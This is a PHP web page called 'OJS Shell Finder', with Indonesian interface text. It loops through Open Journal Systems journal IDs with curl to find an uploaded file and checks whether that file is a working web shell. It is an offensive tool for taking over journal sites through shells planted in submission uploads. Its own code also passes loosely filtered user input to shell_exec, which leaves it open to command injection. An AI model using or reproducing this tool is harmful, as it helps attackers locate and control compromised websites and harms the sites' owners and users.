<html>
<head>
<title>[+] OJS Shell Finder [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white" onload="antixss()">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');


textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea#note {
  width:100%;
    resize: none;
  display:block;
  max-width:100%;
  border: none;
    outline: none;
}

a {
	color: orange;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}

vuln {
	color: green;
}

kgk {
	color: red;
}
shell {
	color: #90ee90;
}
</style>
<body>
<center>
<font face=courier new size=5>OJS Shell Finder<br><font size="3">Mencari Shell Pada OJS Dengan Method Brute Journal ID<br></font><font size="3"><hr>
<form method="post">
Url<br><input type="text" name="url" size="60"><br><br>
Filename<br><input type="text" name="filename"><br><br>
<input type="checkbox" name="stop">Stop If Shell Found<br><br>
<input type="submit" name="go" value="Gaskan">
</form>
<?php
if (isset($_POST['url'])) {
	$url = $_POST['url'];
	$url = str_replace("&", "", $url);
	$url = str_replace("|", "", $url);
	$url = str_replace("*", "", $url);
	$url = str_replace("#", "", $url);
	$url = str_replace("$", "", $url);
	$url = str_replace("^", "", $url);
}
if (isset($_POST['filename'])) {
	$file = $_POST['filename'];
	$file = str_replace("&", "", $file);
	$file = str_replace("|", "", $file);
	$file = str_replace("*", "", $file);
	$file = str_replace("#", "", $file);
	$file = str_replace("$", "", $file);
	$file = str_replace("^", "", $file);
}
if (isset($_POST['filename'])) {
	//$id = $_POST['id'];
	$id = shell_exec("echo '".$file."' | cut -d'-' -f1");
	$id = str_replace("&", "", $id);
	$id = str_replace("|", "", $id);
	$id = str_replace("*", "", $id);
	$id = str_replace("#", "", $id);
	$id = str_replace("$", "", $id);
	$id = str_replace("^", "", $id);
	$id = str_replace("'", "", $id);
	$id = str_replace("\n", "", $id);
}
//$article = array('1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50');
if (isset($_POST['go'])) {
	echo "<hr><pre style='text-align: left; white-space: pre-line;'>";
	if (empty($url)) {
		die('kalo gada urlnya mo ngapain bre wkwk');
	} elseif (empty($file)) {
		die('nama file wajib ada bro');
	}
	ob_implicit_flush();ob_end_flush();
	foreach (range(0, 150) as $art) {
		$web = $url."/files/journals/".$art."/articles/".$id."/submission/original/".$file."";
		$web = str_replace("///", "/", $web);
		$web = str_replace("//", "/", $web);
		$web = str_replace("http:/", "http://", $web);
		$web = str_replace("https:/", "https://", $web);
		$web = str_replace("'", "", $web);
		$web = str_replace("&", "", $web);
		$web = str_replace("|", "", $web);
		$check = shell_exec("curl -sk --ipv4 -o /dev/null -I -w '%{http_code}' '".$web."' --max-time 10");
		if ($check == "200") {
			$cek = shell_exec("curl -Lsk --ipv4 '".$web."' --max-time 10 | grep -e 'pload' -e 'hell'");
			if (!empty($cek)) {
				echo "[<shell>Found Shell</shell>] ".$web."\n";
				if (isset($_POST['stop'])) {
					die('<center><hr><font size=3>Unknown45 - 2021');
				}
			} else {
				echo "[<vuln>Found</vuln>] ".$web."\n";
			}
		} else {
			echo "[<kgk>Not Found</kgk>] ".$web."\n";
		}
	}
}
?>
<center><hr><font size=3>Unknown45 - 2021
</body>
</html>